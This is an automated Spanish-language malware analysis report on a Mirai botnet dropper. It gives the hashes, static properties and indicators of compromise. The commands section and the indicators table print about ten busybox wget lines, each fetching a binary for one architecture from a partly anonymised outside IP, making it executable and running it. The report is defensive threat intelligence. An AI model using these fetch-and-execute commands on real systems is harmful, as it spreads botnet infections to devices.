# 🧬 Payload Analysis

`520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asociaron 10 comandos observados o extraídos.

## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:00:23+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc`
- **SHA1:** `b50e6ab8d0ee446027ba359978bd184b5b6e6479`
- **MD5:** `e4ece402ca6ad6470bd5d6993df428fd`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 1.4 KiB |
| Entropía | 5.09 |
| Strings | 20 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android
busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vciman
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 141.11.88.XXX | static_analysis |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm5; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm6; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.arm7; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.m68k; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.mips; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.ppc; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.sh4; | strings |
| url | hxxp://141.11.88.XXX/bins/vcimanagement.spc; | strings |
| hash | 520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc | static_analysis |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm; chmod 777 vcimanagement.arm; ./vcimanagement.arm android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm5; chmod 777 vcimanagement.arm5; ./vcimanagement.arm5 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm6; chmod 777 vcimanagement.arm6; ./vcimanagement.arm6 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.arm7; chmod 777 vcimanagement.arm7; ./vcimanagement.arm7 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.m68k; chmod 777 vcimanagement.m68k; ./vcimanagement.m68k android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mips; chmod 777 vcimanagement.mips; ./vcimanagement.mips android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.mpsl; chmod 777 vcimanagement.mpsl; ./vcimanagement.mpsl android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.ppc; chmod 777 vcimanagement.ppc; ./vcimanagement.ppc android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.sh4; chmod 777 vcimanagement.sh4; ./vcimanagement.sh4 android | strings |
| command | busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vciman | strings |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
